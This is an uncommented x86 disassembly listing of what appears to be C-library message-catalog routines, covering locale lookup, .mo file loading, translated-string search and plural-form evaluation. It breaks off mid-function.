je 0x80620eb
mov ecx, dword [arg_8h]
movzx edx, byte [esi + ecx]
movzx ecx, dl
mov ebx, edx
test byte [eax + ecx*2 + 1], 4
je 0x80620de
mov eax, 0
mov dword [var_20h], edi
mov dword [var_1ch], 0x80aad14
inc edi
test eax, eax
je 0x8062080
mov dword [esp], 5
call section.
mov dword [var_1ch], eax
mov ecx, dword [var_1ch]
mov edx, dword [ecx]
test edx, edx
je 0x80620a8
movzx eax, bl
mov eax, dword [edx + eax*4]
mov edx, dword [var_20h]
mov byte [edx], al
inc esi
cmp esi, dword [arg_ch]
jb 0x8062020
mov byte [edi], 0
mov eax, dword [var_18h]
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret
mov eax, 0
test eax, eax
je 0x80620d7
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edx, dword [var_1ch]
mov ecx, dword [arg_8h]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [edx], eax
mov edx, eax
movzx ebx, byte [esi + ecx]
jmp 0x8062089
mov eax, dword [0x80a9ab4]
jmp 0x80620bd
lea eax, [ecx - 0x30]
cmp eax, 9
ja 0x8062094
mov byte [edi], dl
inc edi
jmp 0x8062094
mov edx, 0
test edx, edx
je 0x8062111
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
jmp 0x8062046
mov eax, dword [0x80a9ab4]
jmp 0x8062100
mov eax, dword [var_10h]
inc eax
jmp 0x8061fec
mov edx, 0
test edx, edx
je 0x8062150
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ecx, dword [arg_8h]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [edi], eax
mov edx, eax
movzx ebx, byte [esi + ecx]
jmp 0x8061fc1
mov eax, dword [0x80a9ab4]
jmp 0x8062136
mov edx, 0
test edx, edx
je 0x806217f
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8061f88
mov eax, dword [0x80a9ab4]
jmp 0x806216c
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov esi, dword [arg_10h]
push ebx
xor ebx, ebx
cmp esi, 3
jbe 0x807702e
mov edi, esi
shr edi, 2
lea esi, [esi]
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
dec edi
jne 0x8076fe0
and esi, 3
test esi, esi
je 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
dec esi
jne 0x8077032
movzx edx, bl
movzx eax, al
pop ebx
pop esi
pop edi
sub edx, eax
mov eax, edx
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
lea eax, [var_ch]
mov dword [var_8h_2], eax
mov eax, dword [var_8h]
mov dword [var_4h_2], eax
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.08076a80
leave
ret
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
test esi, esi
je 0x8075129
movzx edx, word [esi]
xor edi, edi
test dx, dx
js 0x80750d0
mov eax, 0
test eax, eax
je 0x80750d0
lea eax, [var_1ch]
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], fcn.08074580
mov dword [esp], eax
mov edi, 1
call section.
movzx edx, word [esi]
lea esi, [esi]
test dx, dx
jns 0x807511f
mov eax, dword [esi + 0x94]
xor ebx, ebx
mov dword [esp], esi
call dword [eax + 0x30]
test eax, eax
sete bl
dec ebx
cmp word [esi], 0
jns 0x8075115
test edi, edi
jne 0x8075100
mov eax, ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea eax, [var_1ch]
mov dword [var_sp_4h], 0
mov dword [esp], eax
call section.
jmp 0x80750f3
mov dword [esp], esi
call fcn.08074580
jmp 0x80750ef
mov dword [esp], esi
call fcn.08074540
jmp 0x80750d5
call fcn.0804e3b0
jmp 0x80750f5
push ebp
mov ebp, esp
push edi
push esi
mov esi, 0xffffffff
push ebx
sub esp, 0x20
mov eax, dword [arg_8h]
mov ebx, dword [arg_ch]
mov dword [esp], eax
call fcn.08053400
movzx edx, word [ebx]
mov dword [var_20h], 0
mov edi, eax
test dx, dx
js 0x8075197
mov eax, 0
test eax, eax
je 0x8075197
lea eax, [var_1ch]
mov dword [var_20h], 1
mov dword [var_8h], ebx
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
call section.
movzx edx, word [ebx]
test dx, dx
jns 0x807520b
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x80751af
mov dword [ebx + 0x5c], 0xffffffff
mov eax, 0xffffffff
inc eax
je 0x80751e8
cmp word [ebx], 0
jns 0x80751de
mov eax, dword [var_20h]
test eax, eax
jne 0x80751c9
add esp, 0x20
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x80751bf
mov dword [esp], ebx
call fcn.08074580
jmp 0x80751b8
mov eax, dword [ebx + 0x94]
mov edx, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_8h], edi
mov dword [var_4h], edx
call dword [eax + 0x1c]
cmp eax, edi
mov eax, 1
cmove esi, eax
jmp 0x80751b2
mov dword [esp], ebx
call fcn.08074540
jmp 0x807519c
push ebp
mov ebp, esp
push edi
push esi
mov esi, edx
push ebx
mov ebx, eax
sub esp, 8
lea esi, [esi]
mov eax, dword [ebx]
cmp eax, 1
je 0x805f3e6
jle 0x805f3c2
cmp eax, 2
je 0x805f2df
cmp eax, 3
jne case.default.0x805f313
mov eax, dword [ebx + 8]
mov edx, esi
call fcn.0805f290
test eax, eax
sete al
movzx eax, al
mov ebx, dword [ebx + eax*4 + 0xc]
jmp 0x805f2a0
xor ecx, ecx
add esp, 8
mov eax, ecx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebx + 8]
mov edx, esi
call fcn.0805f290
mov edi, eax
mov eax, dword [ebx + 4]
cmp eax, 0xf
je 0x805f398
cmp eax, 0xe
je 0x805f36b
mov eax, dword [ebx + 0xc]
mov edx, esi
call fcn.0805f290
mov ecx, eax
mov eax, dword [ebx + 4]
sub eax, 3
cmp eax, 0xa
ja case.default.0x805f313
jmp dword [eax*4 + 0x80a01b4]
imul ecx, edi
jmp 0x805f2d5
mov eax, edi
xor edx, edx
div ecx
mov ecx, eax
jmp 0x805f2d5
mov eax, edi
xor edx, edx
div ecx
mov ecx, edx
jmp 0x805f2d5
lea ecx, [ecx + edi]
jmp 0x805f2d5
sub edi, ecx
mov ecx, edi
jmp 0x805f2d5
cmp edi, ecx
setb al
movzx ecx, al
jmp 0x805f2d5
cmp edi, ecx
seta al
jmp 0x805f343
cmp edi, ecx
setbe al
jmp 0x805f343
cmp edi, ecx
setae al
jmp 0x805f343
cmp edi, ecx
sete al
jmp 0x805f343
cmp edi, ecx
setne al
jmp 0x805f343
test edi, edi
mov dword [var_14h], 0
jne 0x805f37e
mov ecx, dword [var_14h]
jmp 0x805f2d5
mov eax, dword [ebx + 0xc]
mov edx, esi
call fcn.0805f290
test eax, eax
mov eax, 1
cmove eax, dword [var_14h]
mov dword [var_14h], eax
jmp 0x805f376
test edi, edi
mov dword [var_10h], 0
je 0x805f3b2
mov dword [var_10h], 1
mov ecx, dword [var_10h]
jmp 0x805f2d5
mov eax, dword [ebx + 0xc]
mov edx, esi
call fcn.0805f290
test eax, eax
je 0x805f3aa
jmp 0x805f3a3
test eax, eax
jne case.default.0x805f313
mov eax, dword [ebx + 4]
mov ecx, esi
test eax, eax
je 0x805f2d5
dec eax
jne case.default.0x805f313
mov ecx, dword [ebx + 8]
jmp 0x805f2d5
mov eax, dword [ebx + 8]
mov edx, esi
call fcn.0805f290
test eax, eax
jmp 0x805f35f
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [esp], str.LANGUAGE
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov esi, eax
call fcn.080631c0
test eax, eax
mov ebx, eax
je 0x805fecb
cmp byte [eax], 0
mov eax, 0
cmove ebx, eax
mov dword [esp], esi
call fcn.08084900
test ebx, ebx
je 0x805fee4
cmp byte [eax], 0x43
jne 0x805fee2
cmp byte [eax + 1], 0
je 0x805fee4
mov eax, ebx
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, eax
push ebx
sub esp, 0x4c
mov dword [var_24h], ecx
mov dword [esp], eax
call fcn.08053400
mov dword [esp], 0x80aa94c
mov dword [var_4h], esi
mov edx, dword [var_24h]
inc eax
mov dword [var_28h], 0
mov dword [var_20h], 0
mov dword [var_1ch], 0
mov dword [var_18h], 0
mov dword [var_14h], 0
mov dword [var_10h], edi
mov dword [var_ch], 0
mov dword [var_sp_24h], edx
mov dword [var_8h], eax
call fcn.08061b40
test eax, eax
mov ebx, eax
je 0x805ffca
mov esi, dword [eax + 4]
test esi, esi
je 0x805ffc0
mov ecx, dword [ebx + 8]
test ecx, ecx
jne 0x805ffa2
mov eax, dword [ebx + 0x10]
xor esi, esi
test eax, eax
je 0x805ffa2
mov edx, dword [eax + 4]
test edx, edx
je 0x805ffae
mov eax, dword [eax + 8]
test eax, eax
jne 0x805ff9c
inc esi
mov eax, dword [ebx + esi*4 + 0x10]
test eax, eax
jne 0x805ff85
xor eax, eax
test esi, esi
js 0x805ffa4
mov eax, ebx
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret 4
mov edx, dword [arg_8h]
call fcn.080606d0
mov eax, dword [ebx + esi*4 + 0x10]
jmp 0x805ff8c
lea esi, [esi]
mov edx, dword [arg_8h]
call fcn.080606d0
jmp 0x805ff75
mov dword [esp], edi
call fcn.08061480
test eax, eax
mov dword [var_bp_28h], eax
je 0x805ffe9
mov dword [esp], eax
call fcn.08076e80
mov edi, eax
xor eax, eax
test edi, edi
je 0x805ffa4
lea eax, [var_bp_10h]
mov dword [esp], edi
mov dword [var_14h], eax
lea eax, [var_bp_14h]
mov dword [var_10h], eax
lea eax, [var_bp_18h]
mov dword [var_ch], eax
lea eax, [var_bp_1ch]
mov dword [var_8h], eax
lea eax, [var_bp_20h]
mov dword [var_4h], eax
call fcn.08062200
mov dword [esp], esi
mov dword [var_2ch], eax
call fcn.08053400
mov dword [esp], 0x80aa94c
mov dword [var_4h], esi
mov edx, dword [var_24h]
inc eax
mov dword [var_28h], 1
mov dword [var_8h], eax
mov dword [var_sp_24h], edx
mov edx, dword [var_bp_1ch]
mov dword [var_20h], edx
mov edx, dword [var_bp_10h]
mov dword [var_1ch], edx
mov edx, dword [var_bp_14h]
mov dword [var_18h], edx
mov edx, dword [var_bp_18h]
mov dword [var_14h], edx
mov edx, dword [var_bp_20h]
mov dword [var_10h], edx
mov edx, dword [var_2ch]
mov dword [var_ch], edx
call fcn.08061b40
mov ebx, eax
xor eax, eax
test ebx, ebx
je 0x805ffa4
mov eax, dword [ebx + 4]
test eax, eax
je 0x80600de
mov esi, dword [ebx + 8]
test esi, esi
jne 0x80600a7
mov eax, dword [ebx + 0x10]
xor esi, esi
test eax, eax
je 0x80600a7
mov ecx, dword [eax + 4]
test ecx, ecx
je 0x80600d0
mov edx, dword [eax + 8]
test edx, edx
jne 0x80600a7
inc esi
mov eax, dword [ebx + esi*4 + 0x10]
test eax, eax
jne 0x8060090
mov eax, dword [var_bp_28h]
test eax, eax
je 0x80600b6
mov dword [esp], edi
call fcn.08051180
test byte [var_2ch], 1
je 0x805ffa2
mov eax, dword [var_bp_10h]
mov dword [esp], eax
call fcn.08051180
jmp 0x805ffa2
mov edx, dword [arg_8h]
call fcn.080606d0
mov eax, dword [ebx + esi*4 + 0x10]
jmp 0x8060097
mov edx, dword [arg_8h]
mov eax, ebx
call fcn.080606d0
jmp 0x8060080
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x54
mov dword [var_24h], ecx
mov dword [var_20h], edx
mov ecx, dword [eax + 4]
mov dword [var_1ch], eax
test ecx, ecx
je 0x805fe34
mov eax, dword [var_1ch]
mov edi, dword [eax + 8]
xor eax, eax
test edi, edi
je 0x805f9b3
mov eax, dword [edi + 0x30]
mov edx, dword [edi + 0x14]
test eax, eax
mov dword [var_28h], edx
jne 0x805fce0
mov ebx, dword [var_28h]
xor esi, esi
cmp esi, ebx
jae 0x805f9b1
lea eax, [ebx + esi]
mov edx, dword [edi]
shr eax, 1
mov dword [var_2ch], eax
mov eax, dword [edi + 0xc]
test eax, eax
je 0x805fccf
mov eax, dword [edi + 0x18]
mov ecx, dword [var_2ch]
mov eax, dword [eax + ecx*8 + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
lea eax, [eax + edx]
mov dword [var_4h], eax
mov eax, dword [var_24h]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jl 0x805fcc7
jle 0x805f9bd
mov esi, dword [var_2ch]
inc esi
cmp esi, ebx
jb 0x805f963
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 4
mov edx, dword [var_28h]
cmp dword [var_2ch], edx
jae 0x805fcb2
mov ecx, dword [edi + 0xc]
mov ebx, dword [edi]
test ecx, ecx
je 0x805fca3
mov edx, dword [edi + 0x1c]
mov esi, dword [var_2ch]
mov eax, dword [edx + esi*8 + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
add ebx, eax
test ecx, ecx
mov dword [var_30h], ebx
je 0x805fc94
mov ecx, dword [var_2ch]
mov eax, dword [edx + ecx*8]
ror ax, 8
ror eax, 0x10
ror ax, 8
inc eax
mov dword [var_34h], eax
mov esi, dword [var_20h]
mov eax, dword [edi + 0x38]
test esi, esi
je 0x805fc8d
mov edx, dword [var_20h]
cmp eax, dword [edx + 8]
je 0x805fa37
mov eax, edi
call fcn.08060690
mov ecx, dword [var_20h]
mov eax, dword [var_1ch]
mov edx, edi
call fcn.08060440
cmp dword [edi + 0x3c], 0xffffffff
je 0x805fb8f
mov ecx, dword [edi + 0x40]
test ecx, ecx
mov dword [var_54h], ecx
je 0x805fc53
cmp dword [var_54h], 0xffffffff
je 0x805fb8f
mov eax, dword [var_2ch]
mov edx, dword [var_54h]
mov ebx, dword [edx + eax*4]
test ebx, ebx
jne 0x805fc3a
mov eax, 0
test eax, eax
je 0x805fa7f
mov dword [esp], 0x80aa924
call section.
mov eax, dword [0x80aa93c]
mov ecx, dword [var_30h]
mov dword [var_44h], 0
mov esi, dword [0x80aa940]
add eax, 4
mov dword [var_18h], ecx
lea esi, [esi]
mov dword [var_14h], eax
cmp esi, 3
jbe 0x805faf3
add esi, dword [var_14h]
mov ecx, dword [var_34h]
lea edx, [var_10h]
add ecx, dword [var_18h]
mov eax, dword [edi + 0x3c]
mov dword [var_8h], edx
lea edx, [esi - 4]
mov dword [var_4h], edx
lea edx, [var_14h]
mov dword [esp], edx
lea edx, [var_18h]
call fcn.08083e80
sub esp, 0xc
test eax, eax
je 0x805fbe3
cmp eax, 4
je 0x805fbe3
cmp eax, 5
jne 0x805fbda
mov esi, dword [var_30h]
mov dword [var_18h], esi
mov ecx, dword [var_44h]
test ecx, ecx
jle 0x805fbb6
inc dword [var_44h]
mov eax, dword [0x80aa948]
mov esi, dword [var_44h]
mov dword [esp], eax
shl esi, 8
sub esi, dword [var_44h]
shl esi, 4
mov dword [0x80aa940], esi
mov dword [var_4h], esi
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x805fb9f
mov eax, dword [0x80aa948]
mov eax, dword [eax]
mov dword [0x80aa948], eax
test ebx, ebx
je 0x805fb66
mov eax, dword [0x80aa948]
mov esi, dword [0x80aa940]
mov dword [ebx], eax
sub esi, 4
lea eax, [ebx + 4]
mov dword [0x80aa93c], eax
mov dword [0x80aa948], ebx
mov dword [0x80aa940], esi
lea eax, [ebx + 8]
jmp 0x805faa0
mov eax, 0
mov dword [0x80aa93c], 0
mov dword [0x80aa940], 0
test eax, eax
je 0x805fb8f
mov dword [esp], 0x80aa924
call section.
mov eax, dword [arg_8h]
mov esi, dword [var_34h]
mov dword [eax], esi
mov eax, dword [var_30h]
jmp 0x805f9b3
mov edx, dword [0x80aa948]
mov eax, dword [edx]
mov dword [esp], edx
mov dword [0x80aa948], eax
call fcn.08051180
jmp 0x805fb36
mov dword [var_44h], 1
mov dword [0x80aa940], 0xff0
mov dword [esp], 0xff0
call fcn.08050fe0
mov ebx, eax
jmp 0x805fb36
mov ebx, 0
test ebx, ebx
jmp 0x805fb81
mov ecx, dword [var_14h]
mov edx, dword [0x80aa93c]
mov esi, dword [edi + 0x40]
mov ebx, ecx
sub ebx, edx
mov dword [var_54h], esi
lea eax, [ebx - 4]
mov dword [edx], eax
mov eax, dword [var_2ch]
mov dword [esi + eax*4], edx
mov esi, dword [0x80aa940]
sub esi, ebx
mov eax, esi
and esi, 0xfffffffc
and eax, 3
mov dword [0x80aa940], esi
add ecx, eax
mov eax, 0
test eax, eax
mov dword [0x80aa93c], ecx
je 0x805fc3a
mov dword [esp], 0x80aa924
call section.
mov edi, dword [edi + 0x40]
mov dword [var_54h], edi
mov edx, dword [var_2ch]
mov ecx, dword [var_54h]
mov eax, dword [ecx + edx*4]
lea ebx, [eax + 4]
mov eax, dword [eax]
mov dword [var_30h], ebx
mov dword [var_34h], eax
jmp 0x805fb8f
mov dword [var_4h], 4
mov ebx, dword [edi + 0x20]
add dword [var_28h], ebx
mov esi, dword [var_28h]
mov dword [esp], esi
call fcn.08051730
test eax, eax
mov dword [edi + 0x40], eax
mov dword [var_54h], eax
jne 0x805fa4f
mov dword [edi + 0x40], 0xffffffff
mov dword [var_54h], 0xffffffff
jmp 0x805fa4f
test eax, eax
jmp 0x805fa21
mov ebx, dword [var_2ch]
mov edx, dword [edx + ebx*8]
inc edx
mov dword [var_34h], edx
jmp 0x805fa0d
mov edx, dword [edi + 0x1c]
mov eax, dword [var_2ch]
add ebx, dword [edx + eax*8 + 4]
jmp 0x805f9ed
mov edx, dword [var_2ch]
mov eax, dword [edi + 0x28]
sub edx, dword [var_28h]
mov esi, dword [eax + edx*8 + 4]
mov edx, dword [eax + edx*8]
mov dword [var_30h], esi
jmp 0x805fc9b
mov ebx, dword [var_2ch]
jmp 0x805f9ad
mov eax, dword [edi + 0x18]
mov ecx, dword [var_2ch]
add edx, dword [eax + ecx*8 + 4]
mov eax, edx
jmp 0x805f990
mov ecx, dword [var_24h]
mov dword [esp], ecx
call fcn.08053400
mov ebx, dword [var_24h]
mov dword [var_38h], eax
mov dword [esp], ebx
call fcn.08062bb0
xor edx, edx
mov esi, dword [edi + 0x2c]
mov ebx, eax
div esi
mov dword [var_48h], esi
mov eax, ebx
mov ebx, dword [edi + 0x30]
mov dword [var_4ch], ebx
mov esi, edx
mov edx, dword [var_48h]
sub edx, 2
mov ecx, edx
xor edx, edx
div ecx
mov eax, dword [edi + 0x34]
mov dword [var_50h], eax
inc edx
mov dword [var_3ch], edx
mov eax, dword [var_50h]
test eax, eax
je 0x805fe29
mov edx, dword [var_4ch]
mov ebx, dword [edx + esi*4]
ror bx, 8
ror ebx, 0x10
ror bx, 8
xor eax, eax
test ebx, ebx
je 0x805f9b3
dec ebx
cmp ebx, dword [var_28h]
jae 0x805fdee
mov ecx, dword [edi + 0xc]
test ecx, ecx
je 0x805fde3
mov edx, dword [edi + 0x18]
mov eax, dword [edx + ebx*8]
ror ax, 8
ror eax, 0x10
ror ax, 8
cmp eax, dword [var_38h]
jb 0x805fdb6
mov eax, dword [edi]
test ecx, ecx
mov dword [var_40h], eax
je 0x805fdda
mov eax, dword [edx + ebx*8 + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, dword [var_40h]
mov edx, dword [var_24h]
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.08076e50
test eax, eax
je 0x805fdd2
mov edx, dword [edi + 0x30]
mov ecx, dword [edi + 0x2c]
mov ebx, dword [edi + 0x34]
mov dword [var_4ch], edx
mov dword [var_48h], ecx
mov dword [var_50h], ebx
mov eax, dword [var_48h]
mov ebx, dword [var_3ch]
mov ecx, esi
sub eax, dword [var_3ch]
lea edx, [ebx + esi]
sub ecx, eax
cmp esi, eax
mov esi, ecx
cmovb esi, edx
jmp 0x805fd25
mov dword [var_2ch], ebx
jmp 0x805f9bd
mov eax, dword [var_40h]
add eax, dword [edx + ebx*8 + 4]
jmp 0x805fd91
mov edx, dword [edi + 0x18]
mov eax, dword [var_38h]
cmp dword [edx + ebx*8], eax
jmp 0x805fd74
mov edx, ebx
mov eax, dword [edi + 0x24]
mov ecx, dword [var_38h]
sub edx, dword [var_28h]
cmp dword [eax + edx*8], ecx
jbe 0x805fdb6
mov eax, dword [eax + edx*8 + 4]
mov dword [var_4h], eax
mov eax, dword [var_24h]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x805fdd2
mov eax, dword [edi + 0x30]
mov edx, dword [edi + 0x2c]
mov ecx, dword [edi + 0x34]
mov dword [var_4ch], eax
mov dword [var_48h], edx
mov dword [var_50h], ecx
jmp 0x805fdb6
mov ecx, dword [var_4ch]
mov ebx, dword [ecx + esi*4]
jmp 0x805fd41
call fcn.080606d0
jmp 0x805f93d
push ebp
mov ebp, esp
push edi
mov edi, ecx
push esi
push ebx
sub esp, 8
mov ebx, dword [eax + 8]
mov eax, dword [ebx + 0x44]
call fcn.0805f290
mov edx, edi
cmp eax, dword [ebx + 0x48]
mov esi, eax
mov eax, 0
cmovae esi, eax
mov eax, esi
dec esi
test eax, eax
je 0x805fe92
mov eax, dword [arg_8h]
lea ebx, [eax + edi]
mov dword [esp], edx
mov dword [var_4h], 0
call fcn.080537a0
mov edx, eax
mov eax, edi
inc edx
cmp edx, ebx
jae 0x805fe94
mov eax, esi
dec esi
test eax, eax
jne 0x805fe72
mov eax, edx
add esp, 8
pop ebx
pop esi
pop edi
leave
ret 4
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, eax
mov eax, dword [eax + 0x40]
test eax, eax
je 0x80606b0
cmp eax, 0xffffffff
je 0x80606b0
mov dword [esp], eax
call fcn.08051180
nop
mov eax, dword [ebx + 0x3c]
cmp eax, 0xffffffff
je 0x80606c1
mov ebx, dword [var_4h]
leave
jmp 0x8084060
mov ebx, dword [var_4h]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xe4
mov ebx, dword [eax]
mov dword [eax + 8], 0
mov dword [var_78h], eax
mov dword [var_7ch], edx
mov dword [var_88h], 0
mov dword [eax + 4], 1
test ebx, ebx
je 0x8060955
xor ecx, ecx
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov edi, eax
ja 0x8061465
cmp edi, 0xffffffff
je 0x8060955
lea eax, [var_6ch]
mov dword [var_4h], edi
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08053dc0
test eax, eax
jne 0x8061457
mov ebx, dword [var_40h]
mov eax, dword [var_40h]
mov edx, dword [var_3ch]
mov dword [var_80h], ebx
xor ebx, ebx
mov ecx, dword [var_80h]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8061457
cmp dword [var_80h], 0x2f
jbe 0x8061457
mov eax, dword [var_80h]
mov dword [var_14h], 0
mov dword [var_10h], edi
mov dword [var_sp_ch], 2
mov dword [var_8h], 1
mov dword [esp], 0
mov dword [var_4h], eax
call fcn.080546d0
mov dword [var_84h], eax
inc eax
je 0x80613ad
mov ebx, edi
mov eax, 6
int 0x80
mov dword [var_88h_2], 1
mov edx, dword [var_84h]
mov eax, dword [edx]
cmp eax, 0x950412de
jne 0x8061371
mov dword [esp], 0x4c
call fcn.08050fe0
test eax, eax
mov dword [var_8ch], eax
je 0x8060955
mov edx, dword [var_78h]
mov ebx, dword [var_84h]
mov ecx, eax
mov dword [edx + 8], eax
mov dword [eax], ebx
mov dword [ecx + 0x10], 0
mov eax, dword [var_88h]
mov edx, dword [var_80h]
mov dword [ecx + 4], eax
mov dword [ecx + 8], edx
xor eax, eax
cmp dword [ebx], 0x950412de
setne al
test eax, eax
mov dword [ecx + 0xc], eax
je 0x8061363
mov ebx, dword [ebx + 4]
ror bx, 8
ror ebx, 0x10
ror bx, 8
mov eax, ebx
sar eax, 0x10
cmp eax, 1
ja 0x80611af
mov edx, dword [var_8ch]
mov esi, dword [edx + 0xc]
test esi, esi
mov edx, esi
je 0x8061355
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 8]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [var_8ch]
test edx, edx
mov dword [ecx + 0x14], eax
je 0x8061347
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0xc]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, ecx
mov ecx, dword [var_8ch]
test edx, edx
mov dword [ecx + 0x18], eax
je 0x8061339
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0x10]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, ecx
mov ecx, dword [var_8ch]
test edx, edx
mov dword [ecx + 0x1c], eax
je 0x806132b
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0x14]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [var_8ch]
mov dword [ecx + 0x2c], eax
xor ecx, ecx
cmp eax, 2
jbe 0x8060907
test edx, edx
je 0x806131d
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0x18]
ror ax, 8
ror eax, 0x10
ror ax, 8
add ecx, eax
mov eax, dword [var_8ch]
test bx, bx
mov dword [eax + 0x30], ecx
mov dword [eax + 0x34], edx
jne 0x806095d
mov dword [eax + 0x20], 0
mov dword [eax + 0x24], 0
mov dword [eax + 0x28], 0
mov ecx, dword [var_7ch]
mov edx, dword [var_8ch]
mov eax, dword [var_78h]
call fcn.08060440
mov edx, dword [var_8ch]
mov ecx, dword [var_8ch]
add edx, 0x44
add ecx, 0x48
call fcn.08062a80
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
test ecx, ecx
je 0x80611af
test edx, edx
je 0x8061309
mov ecx, dword [var_84h_2]
mov ecx, dword [ecx + 0x24]
ror cx, 8
ror ecx, 0x10
ror cx, 8
mov dword [var_94h_2], ecx
mov ebx, dword [var_94h]
test ebx, ebx
je 0x80612e9
test edx, edx
je 0x80612d5
mov eax, dword [var_84h_2]
mov eax, dword [eax + 0x1c]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [var_98h_2], eax
test edx, edx
je 0x80612c7
mov ebx, dword [var_84h_2]
mov eax, dword [ebx + 0x20]
ror ax, 8
ror eax, 0x10
ror ax, 8
add ebx, eax
mov edx, dword [var_98h]
mov dword [var_bch], 0
lea eax, [edx*4 + 0x10]
sub esp, eax
lea ecx, [var_27h]
and ecx, 0xfffffff0
cmp dword [var_bch], edx
mov dword [var_c4h], ecx
jae 0x8060a9a
test esi, esi
je 0x80612b2
mov edx, dword [var_bch_2]
mov eax, dword [ebx + edx*8 + 4]
mov edx, dword [var_84h_2]
ror ax, 8
ror eax, 0x10
ror ax, 8
add edx, eax
test esi, esi
je 0x80612a4
mov ecx, dword [var_bch_2]
mov eax, dword [ebx + ecx*8]
ror ax, 8
ror eax, 0x10
ror ax, 8
test eax, eax
je 0x80611af
cmp byte [eax + edx - 1], 0
jne 0x80611af
mov dword [esp], edx
call fcn.08060100
mov ecx, dword [var_c4h_2]
mov edx, dword [var_bch_2]
mov dword [ecx + edx*4], eax
mov eax, dword [var_98h_2]
inc edx
mov dword [var_bch_2], edx
cmp edx, eax
jae 0x8060a91
mov eax, dword [var_8ch_2]
mov esi, dword [eax + 0xc]
jmp 0x8060a07
mov edx, dword [var_8ch_2]
mov esi, dword [edx + 0xc]
test esi, esi
je 0x8061290
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0x28]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, ecx
mov dword [var_9ch_2], eax
test esi, esi
je 0x806127c
mov edx, dword [var_84h_2]
mov eax, dword [edx + 0x2c]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, edx
mov dword [var_a0h_2], eax
mov ebx, dword [var_8ch]
mov dword [var_a4h], 0
mov dword [var_bch], 0
mov eax, dword [ebx + 0x2c]
shl eax, 2
mov dword [var_a8h], eax
mov eax, dword [var_94h]
cmp dword [var_a4h], eax
jae 0x8060c34
mov dword [var_c8h], 1
mov dword [var_c0h], 0
test esi, esi
je 0x806123e
mov ecx, dword [var_c0h]
test ecx, ecx
jne 0x806122a
mov edx, dword [var_bch_2]
mov ecx, dword [var_9ch_2]
mov eax, dword [ecx + edx*4]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, dword [var_84h_2]
xor edi, edi
lea ebx, [eax + 4]
test esi, esi
je 0x8061221
mov eax, dword [ebx + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
inc eax
je 0x8060be6
test esi, esi
je 0x806121a
mov eax, dword [ebx]
ror ax, 8
ror eax, 0x10
